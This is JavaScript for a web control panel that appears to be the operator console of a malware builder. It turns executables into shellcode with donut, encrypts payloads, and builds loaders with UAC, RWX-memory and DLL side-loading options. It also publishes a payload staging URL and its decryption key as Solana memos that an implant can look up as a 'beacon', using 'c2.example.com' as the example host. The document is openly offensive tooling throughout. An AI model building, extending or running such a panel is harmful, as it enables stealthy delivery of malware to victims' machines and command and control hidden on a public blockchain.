async function refreshEncryptHistory() {
  try { _encryptHistory = await fetch("/api/encrypt/history").then(r => r.json()); }
  catch (_) { _encryptHistory = []; }
  renderEncryptHistory();
}

function renderEncryptHistory() {
  const list  = $("#encrypt-history-list");
  const empty = $("#encrypt-hist-empty");
  list.querySelectorAll(".hist-item").forEach(el => el.remove());

  if (!_encryptHistory.length) { empty.style.display = ""; return; }
  empty.style.display = "none";

  for (const j of _encryptHistory) {
    const el = document.createElement("div");
    el.className = "hist-item";
    // store key fragment safely on element — avoids quote-escaping issues
    el.dataset.key = j.key || "";

    const dot        = j.ok ? `<span class="ji-dot dot-ok">●</span>` : `<span class="ji-dot dot-bad">○</span>`;
    const wallet     = j.wallet ? trunc(j.wallet, 22) : "—";
    const dateStr    = fmtTimeShort(j.created_at);
    const donutBadge = j.donut_label
      ? `<span class="ji-label-badge">${j.donut_label}</span>`
      : "";

    // download links
    let dls = `<a class="btn-xs" href="/api/encrypt/history/${j.id}/download/payload_h">↓ Payload.h</a>`;
    if (j.dat_size > 0)
      dls += ` <a class="btn-xs primary" href="/api/encrypt/history/${j.id}/download/dat">↓ data.enc</a>`;

    // action buttons
    const copyBtnHtml    = j.key ? `<button class="btn-xs btn-hist-copy">Copy key</button>` : "";
    const canPublish     = j.key && j.wallet_id;
    const publishBtnHtml = canPublish ? `<button class="btn-xs btn-hist-pub">⚡ Publish</button>` : "";

    el.innerHTML = `
      <div class="hist-head">
        ${dot}
        <span class="hist-name">${wallet}</span>
        <button class="btn-xs btn-danger hist-del" title="Delete run + files">✕</button>
      </div>
      <div class="hist-meta">
        <span class="ji-id">#${j.id}</span>
        ${donutBadge}
        <span>${j.dat_size ? fmtSize(j.dat_size) + " enc" : ""}</span>
        <span>${dateStr}</span>
      </div>
      <div class="hist-dls">${dls} ${copyBtnHtml} ${publishBtnHtml}</div>

      <!-- publish panel (hidden until ⚡ Publish clicked) -->
      <div class="hist-pub-panel hidden">
        <div class="hist-pub-row">
          <input class="hist-pub-url" type="url" placeholder="Staging URL — https://c2.example.com/data.enc" style="flex:2">
          <button class="btn-xs primary hist-pub-btn">Publish on-chain</button>
        </div>
        <pre class="hist-pub-out"></pre>
      </div>`;

    list.appendChild(el);

    // ── wire delete ──
    el.querySelector(".hist-del").addEventListener("click", (ev) => {
      ev.stopPropagation();
      deleteEncryptHistory(j.id);
    });

    // ── wire copy key ──
    el.querySelector(".btn-hist-copy")?.addEventListener("click", () => {
      const key = el.dataset.key;
      if (!key) return;
      navigator.clipboard.writeText(key).then(() => {
        const btn = el.querySelector(".btn-hist-copy");
        const orig = btn.textContent;
        btn.textContent = "Copied!";
        setTimeout(() => { btn.textContent = orig; }, 1800);
      }).catch(() => {});
    });

    // ── wire publish toggle ──
    el.querySelector(".btn-hist-pub")?.addEventListener("click", () => {
      el.querySelector(".hist-pub-panel").classList.toggle("hidden");
    });

    // ── publish button: join staging URL + stored key → memo, then post ──
    el.querySelector(".hist-pub-btn")?.addEventListener("click", async () => {
      const panel      = el.querySelector(".hist-pub-panel");
      const out        = panel.querySelector(".hist-pub-out");
      const stagingUrl = panel.querySelector(".hist-pub-url").value.trim();
      const key        = el.dataset.key;
      const wid        = j.wallet_id;

      if (!stagingUrl || !stagingUrl.startsWith("http")) {
        out.textContent = "[-] Staging URL required (must start with http).";
        out.className = "hist-pub-out bad"; return;
      }
      if (!key) { out.textContent = "[-] No decrypt key stored."; out.className = "hist-pub-out bad"; return; }
      if (!wid) { out.textContent = "[-] Wallet not in workspace (manual address used)."; out.className = "hist-pub-out bad"; return; }

      const memo = `${stagingUrl}|${key}`;

      const btn = el.querySelector(".hist-pub-btn");
      btn.disabled = true; btn.textContent = "Publishing…";
      out.textContent = "> broadcasting …";
      out.className   = "hist-pub-out";

      try {
        const r = await fetch(`/api/wallets/${wid}/publish`, {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ memo }),
        });
        const jr = await r.json();
        if (jr.ok) {
          out.textContent = `[+] Sent!  Sig: ${jr.signature}\nhttps://solscan.io/tx/${jr.signature}`;
          out.className   = "hist-pub-out ok";
        } else {
          out.textContent = `[-] ${jr.error || jr.stderr || "Failed"}`;
          out.className   = "hist-pub-out bad";
        }
      } catch (err) {
        out.textContent = `[network error] ${err}`;
        out.className   = "hist-pub-out bad";
      } finally {
        btn.disabled = false; btn.textContent = "Publish on-chain";
      }
    });
  }
}

async function deleteEncryptHistory(id) {
  if (!confirm(`Delete encrypt run #${id} and all its artifacts?`)) return;
  await fetch(`/api/encrypt/history/${id}`, { method: "DELETE" });
  refreshEncryptHistory();
}

$("#btn-refresh-encrypt-hist").addEventListener("click", refreshEncryptHistory);

// ─── build history ────────────────────────────────────────────────────────

let _buildHistory = [];

async function refreshBuildHistory() {
  try { _buildHistory = await fetch("/api/build/history").then(r => r.json()); }
  catch (_) { _buildHistory = []; }
  renderBuildHistory();
  refreshArtifacts();
}

function renderBuildHistory() {
  const list  = $("#build-history-list");
  const empty = $("#build-hist-empty");
  list.querySelectorAll(".hist-item").forEach(el => el.remove());

  if (!_buildHistory.length) { empty.style.display = ""; return; }
  empty.style.display = "none";

  for (const j of _buildHistory) {
    const el = document.createElement("div");
    el.className = "hist-item";
    const dot     = j.ok ? `<span class="ji-dot dot-ok">●</span>` : `<span class="ji-dot dot-bad">○</span>`;
    const dateStr = fmtTimeShort(j.created_at);
    const flags   = [j.mode, j.uac ? "uac" : "", j.rwx ? "rwx" : "", j.debug ? "dbg" : "", j.synthetic ? "syn" : ""]
                      .filter(Boolean).join(" · ");

    let dls = `<a class="btn-xs" href="/api/build/history/${j.id}/download/output" title="Download build log">↓ log</a>`;
    if (j.zip_size > 0)
      dls += ` <a class="btn-xs primary" href="/api/build/history/${j.id}/download/zip" title="Download deployment ZIP">↓ ${j.zip_name}</a>`;
    if (j.binary_size > 0 && (j.mode !== "sideload" || !j.zip_size))
      dls += ` <a class="btn-xs primary" href="/api/build/history/${j.id}/download/binary" title="Download ${j.binary_name}">↓ ${j.binary_name}</a>`;
    if (j.mode === "sideload" && j.binary_size > 0)
      dls += ` <a class="btn-xs" href="/api/build/history/${j.id}/download/binary" title="Download standalone proxy DLL">↓ dll</a>`;
    if (j.sideload_h_size > 0)
      dls += ` <a class="btn-xs" href="/api/build/history/${j.id}/download/sideload_h" title="Download Sideload.h">↓ Sideload.h</a>`;

    el.innerHTML = `
      <div class="hist-head">
        ${dot}
        <span class="hist-name">${j.binary_name || "—"}</span>
        <button class="btn-xs btn-danger hist-del" data-hid="${j.id}" title="Delete">✕</button>
      </div>
      <div class="hist-meta">
        <span class="ji-id">#${j.id}</span>
        <span>${flags}</span>
        <span>${j.binary_size ? fmtSize(j.binary_size) : ""}</span>
        <span>${dateStr}</span>
      </div>
      <div class="hist-dls">${dls}</div>`;
    list.appendChild(el);

    el.querySelector(".hist-del").addEventListener("click", (ev) => {
      ev.stopPropagation();
      deleteBuildHistory(j.id);
    });
  }
}

async function deleteBuildHistory(id) {
  if (!confirm(`Delete build #${id} and all its artifacts?`)) return;
  await fetch(`/api/build/history/${id}`, { method: "DELETE" });
  refreshBuildHistory();
}

$("#btn-refresh-build-hist").addEventListener("click", refreshBuildHistory);

// ─── donut ────────────────────────────────────────────────────────────────

let _donutJobs = [];

async function refreshDonutJobs() {
  try { _donutJobs = await fetch("/api/donut/jobs").then(r => r.json()); }
  catch (_) { _donutJobs = []; }
  renderDonutJobs();
}

function renderDonutJobs() {
  const hist  = $("#donut-history");
  const empty = $("#donut-empty");
  hist.querySelectorAll(".job-item").forEach(el => el.remove());

  if (!_donutJobs.length) { empty.style.display = ""; return; }
  empty.style.display = "none";

  for (const j of _donutJobs) {
    const el = document.createElement("div");
    el.className = "job-item";
    const statusDot = j.ok ? "●" : "○";
    const statusCls = j.ok ? "dot-ok" : "dot-bad";
    const labelBadge = j.label
      ? `<span class="ji-label-badge">${j.label}</span>`
      : "";
    el.innerHTML = `
      <div class="ji-head">
        <span class="ji-dot ${statusCls}">${statusDot}</span>
        <span class="ji-id-inline">#${j.id.slice(0, 6)}</span>
        ${labelBadge}
        <span class="ji-name">${j.original_name}</span>
        <button class="btn-xs ji-edit" title="Edit label">✎</button>
        <button class="btn-xs btn-danger ji-del" data-jid="${j.id}" title="Delete">✕</button>
      </div>
      <div class="ji-label-row hidden">
        <input class="ji-label-input" type="text" maxlength="64" placeholder="Label…" value="${j.label || ""}">
        <button class="btn-xs primary ji-label-save">Save</button>
        <button class="btn-xs ji-label-cancel">✕</button>
      </div>
      <div class="ji-meta">
        <span class="ji-id">#${j.id}</span>
        <span>${j.arch_label}</span>
        ${j.size_in  ? `<span>${fmtSize(j.size_in)} in</span>` : ""}
        ${j.size_out ? `<span>→ ${fmtSize(j.size_out)}</span>` : ""}
      </div>
      <div class="ji-date">${fmtTimeShort(j.created_at)}</div>
      ${j.ok ? `
      <div class="ji-dls">
        <a class="btn-xs" href="/api/donut/jobs/${j.id}/download/original">↓ orig</a>
        <a class="btn-xs primary" href="/api/donut/jobs/${j.id}/download/shellcode">↓ shellcode</a>
      </div>` : ""}`;
    hist.insertBefore(el, hist.firstChild);

    el.querySelector(".ji-del").addEventListener("click", (ev) => {
      ev.stopPropagation();
      deleteDonutJob(j.id);
    });

    const labelRow    = el.querySelector(".ji-label-row");
    const labelInput  = el.querySelector(".ji-label-input");
    el.querySelector(".ji-edit").addEventListener("click", () => {
      labelRow.classList.toggle("hidden");
      if (!labelRow.classList.contains("hidden")) labelInput.focus();
    });
    el.querySelector(".ji-label-cancel").addEventListener("click", () =>
      labelRow.classList.add("hidden"));
    el.querySelector(".ji-label-save").addEventListener("click", () =>
      saveDonutLabel(j.id, labelInput.value));
  }
}

async function saveDonutLabel(id, label) {
  await fetch(`/api/donut/jobs/${id}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ label: label.trim() }),
  });
  await refreshDonutJobs();
  refreshEncryptDropdowns();
}

async function deleteDonutJob(id) {
  if (!confirm(`Delete job #${id} and its files?`)) return;
  await fetch(`/api/donut/jobs/${id}`, { method: "DELETE" });
  refreshDonutJobs();
}

$("#form-donut").addEventListener("submit", async (e) => {
  e.preventDefault();
  const out    = $("#out-donut");
  const result = $("#donut-result");
  result.classList.add("hidden"); result.innerHTML = "";
  writeConsole(out, "> running donut.exe …\n", { reset: true });
  const btn = $("button.primary", e.target);
  btn.disabled = true; btn.textContent = "Converting…";
  try {
    const r = await fetch("/api/donut", { method: "POST", body: new FormData(e.target) });
    const j = await r.json();
    if (j.stdout) writeConsole(out, j.stdout);
    if (j.stderr) writeConsole(out, j.stderr);
    writeConsole(out, `\n[exit ${j.code ?? (j.ok ? 0 : -1)}]\n`, { ok: j.ok });
    if (j.ok && j.job) {
      result.innerHTML = `
        <a class="dl-link" href="/api/donut/jobs/${j.job.id}/download/shellcode">
          ⬇ shellcode_${j.job.id}.bin (${fmtSize(j.job.size_out)})
        </a>`;
      result.classList.remove("hidden");
      refreshDonutJobs();
      // Update encrypt dropdown if build page is in view
      refreshEncryptDropdowns();
    }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  finally { btn.disabled = false; btn.textContent = "Convert"; }
});

// ─── wallets ──────────────────────────────────────────────────────────────

let _wallets = [];
let _selWalletId = null;

async function refreshWallets() {
  try { _wallets = await fetch("/api/wallets").then(r => r.json()); }
  catch (_) { _wallets = []; }
  renderWallets();
  if (_selWalletId && !_wallets.find(w => w.id === _selWalletId)) {
    _selWalletId = null;
    showWalletPanel(null);
  }
  // Also refresh encrypt dropdowns (wallets may have changed)
  refreshEncryptDropdowns();
}

function renderWallets() {
  const list  = $("#wallet-list");
  const empty = $("#wallet-empty");
  list.querySelectorAll(".wallet-item").forEach(el => el.remove());

  if (!_wallets.length) { empty.style.display = ""; return; }
  empty.style.display = "none";

  for (const w of _wallets) {
    const el = document.createElement("div");
    el.className = "wallet-item" + (w.id === _selWalletId ? " selected" : "");
    el.dataset.wid = w.id;
    el.innerHTML = `
      <div class="wi-name">${w.name}</div>
      <div class="wi-addr">${trunc(w.address, 28)}</div>
      <div class="wi-date">${fmtTimeShort(w.created_at)}</div>`;
    el.addEventListener("click", () => selectWallet(w.id));
    list.appendChild(el);
  }
}

function selectWallet(id) {
  _selWalletId = id;
  renderWallets();
  showWalletPanel(_wallets.find(w => w.id === id) || null);
}

function showWalletPanel(w) {
  const panel = $("#wallet-panel");
  const none  = $("#wallet-none");
  if (!w) {
    panel.classList.add("hidden"); none.classList.remove("hidden"); return;
  }
  none.classList.add("hidden"); panel.classList.remove("hidden");
  $("#wp-name").textContent = w.name;
  $("#wp-addr").textContent = w.address;
  $("#btn-wallet-dl-kp").href = `/api/wallets/${w.id}/keypair`;
  // clear outputs
  [$("#out-publish"), $("#out-lookup")].forEach(el => {
    el.textContent = ""; el.classList.remove("ok", "bad");
  });
  $("#wallet-rename-row").classList.add("hidden");
}

// copy address
$("#btn-copy-addr").addEventListener("click", async () => {
  const addr = $("#wp-addr").textContent.trim();
  if (!addr) return;
  try {
    await navigator.clipboard.writeText(addr);
    const btn = $("#btn-copy-addr");
    btn.textContent = "Copied!";
    setTimeout(() => { btn.textContent = "Copy"; }, 1800);
  } catch {
    const sel = window.getSelection(), range = document.createRange();
    range.selectNodeContents($("#wp-addr"));
    sel.removeAllRanges(); sel.addRange(range);
  }
});

// create wallet
$("#btn-create-wallet").addEventListener("click", async () => {
  const name = $("#new-wallet-name").value.trim() || "Wallet";
  const btn  = $("#btn-create-wallet");
  btn.disabled = true; btn.textContent = "Creating…";
  try {
    const r = await fetch("/api/wallets", {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name }),
    });
    const j = await r.json();
    if (j.ok) {
      $("#new-wallet-name").value = "";
      await refreshWallets();
      selectWallet(j.wallet.id);
    } else {
      alert("Create failed: " + (j.stderr || j.error || "unknown"));
    }
  } catch (err) { alert(`Network error: ${err}`); }
  finally { btn.disabled = false; btn.textContent = "+ Create"; }
});

// rename
$("#btn-wallet-rename").addEventListener("click", () => {
  const row = $("#wallet-rename-row");
  row.classList.toggle("hidden");
  if (!row.classList.contains("hidden")) {
    const w = _wallets.find(x => x.id === _selWalletId);
    $("#wallet-rename-input").value = w?.name || "";
    $("#wallet-rename-input").focus();
  }
});
$("#btn-cancel-rename").addEventListener("click", () =>
  $("#wallet-rename-row").classList.add("hidden"));
$("#btn-confirm-rename").addEventListener("click", async () => {
  if (!_selWalletId) return;
  const name = $("#wallet-rename-input").value.trim();
  if (!name) return;
  await fetch(`/api/wallets/${_selWalletId}`, {
    method: "PUT", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name }),
  });
  $("#wallet-rename-row").classList.add("hidden");
  await refreshWallets();
  selectWallet(_selWalletId);
});

// delete
$("#btn-wallet-delete").addEventListener("click", async () => {
  if (!_selWalletId) return;
  const w = _wallets.find(x => x.id === _selWalletId);
  if (!confirm(`Delete wallet "${w?.name}"?\nThe keypair stored on this server will be permanently erased.`)) return;
  await fetch(`/api/wallets/${_selWalletId}`, { method: "DELETE" });
  _selWalletId = null;
  showWalletPanel(null);
  refreshWallets();
});

// publish
$("#form-publish").addEventListener("submit", async (e) => {
  e.preventDefault();
  if (!_selWalletId) return;
  const out = $("#out-publish");
  writeConsole(out, "> broadcasting memo …\n", { reset: true });
  const btn = $("button.primary", e.target);
  btn.disabled = true; btn.textContent = "Publishing…";
  try {
    const r = await fetch(`/api/wallets/${_selWalletId}/publish`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        memo: $("#wp-memo").value.trim(),
      }),
    });
    const j = await r.json();
    if (j.ok) {
      writeConsole(out,
        `[+] Sent!\n    Sig: ${j.signature}\n    https://solscan.io/tx/${j.signature}\n`,
        { ok: true });
    } else {
      writeConsole(out, `[-] ${j.error || j.stderr || "Failed"}\n`, { ok: false });
    }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  finally { btn.disabled = false; btn.textContent = "Publish on-chain"; }
});

// lookup — two modes
async function doLookup(mode) {
  if (!_selWalletId) return;
  const out = $("#out-lookup");
  const label = mode === "beacon" ? "beacon (oldest) memo" : "latest memo";
  writeConsole(out, `> looking up ${label} …\n`, { reset: true });
  const btnLatest = $("#btn-lookup-latest");
  const btnBeacon = $("#btn-lookup-beacon");
  btnLatest.disabled = btnBeacon.disabled = true;
  try {
    const r = await fetch(`/api/wallets/${_selWalletId}/lookup`, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ mode }),
    });
    const j = await r.json();
    if (j.found) {
      writeConsole(out,
        `[+] Memo found (scanned ${j.scanned ?? "?"} tx)\n    Sig: ${j.signature}\n\n${j.memo}\n`,
        { ok: true });
    } else if (j.error) {
      writeConsole(out, `[-] ${j.error}\n`, { ok: false });
    } else {
      writeConsole(out, `[-] No memo found (scanned ${j.scanned ?? "?"} tx).\n`);
    }
  } catch (err) { writeConsole(out, `[network error] ${err}\n`, { ok: false }); }
  finally { btnLatest.disabled = btnBeacon.disabled = false; }
}

$("#btn-lookup-latest").addEventListener("click", () => doLookup("latest"));
$("#btn-lookup-beacon").addEventListener("click", () => doLookup("beacon"));

// ─── Payload.h selector (build panel) ────────────────────────────────────

async function refreshPayloadSelector() {
  const wrap   = $("#bld-payload-sel-wrap");
  const hidden = $("#bld-payload-sel");
  if (!wrap || !hidden) return;
  const prev = hidden.value;
  const list = wrap.querySelector(".cdd-list");

  try {
    const runs = await fetch("/api/encrypt/history").then(r => r.json());
    list.innerHTML = "";

    // placeholder
    const ph = document.createElement("div");
    ph.className = "cdd-item cdd-placeholder";
    ph.textContent = "— use existing Payload.h in project root —";
    ph.addEventListener("click", () => {
      hidden.value = "";
      _cddSetDisplay(wrap, "— use existing Payload.h in project root —");
      wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.remove("cdd-selected"));
      _cddClose();
    });
    list.appendChild(ph);

    const ok = runs.filter(r => r.ok);
    for (const r of ok) {
      const item = document.createElement("div");
      item.className = "cdd-item";
      item.dataset.value = r.id;
      const wallet     = r.wallet      ? trunc(r.wallet, 20) : "—";
      const labelHtml  = r.donut_label
        ? `<span class="cdd-label-badge">${r.donut_label}</span>`
        : "";
      item.innerHTML = `
        <span class="cdd-item-id">#${r.id.slice(0,6)}</span>
        ${labelHtml}
        <span class="cdd-item-name">${wallet}</span>
        <span class="cdd-item-meta">${fmtTimeShort(r.created_at)}</span>`;
      item.addEventListener("click", () => {
        hidden.value = r.id;
        _cddSetDisplay(wrap, item.innerHTML);
        wrap.querySelectorAll(".cdd-item").forEach(i => i.classList.toggle("cdd-selected", i === item));
        _cddClose();
      });
      if (r.id === prev) {
        item.classList.add("cdd-selected");
        _cddSetDisplay(wrap, item.innerHTML);
      }
      list.appendChild(item);
    }

    if (!prev || !ok.find(r => r.id === prev)) {
      _cddSetDisplay(wrap, "— use existing Payload.h in project root —");
      hidden.value = "";
    }

    const trigger = wrap.querySelector(".cdd-trigger");
    trigger.onclick = (e) => {
      e.stopPropagation();
      const isOpen = wrap.classList.contains("open");
      _cddClose();
      if (!isOpen) { wrap.classList.add("open"); list.classList.remove("hidden"); }
    };
  } catch (_) {}
}

// ─── boot ─────────────────────────────────────────────────────────────────

refreshStatus();
refreshEncProfiles();
refreshBldProfiles();
refreshEncryptDropdowns();
refreshSideloadAssets();
refreshEncryptHistory();
refreshBuildHistory();
refreshPayloadSelector();
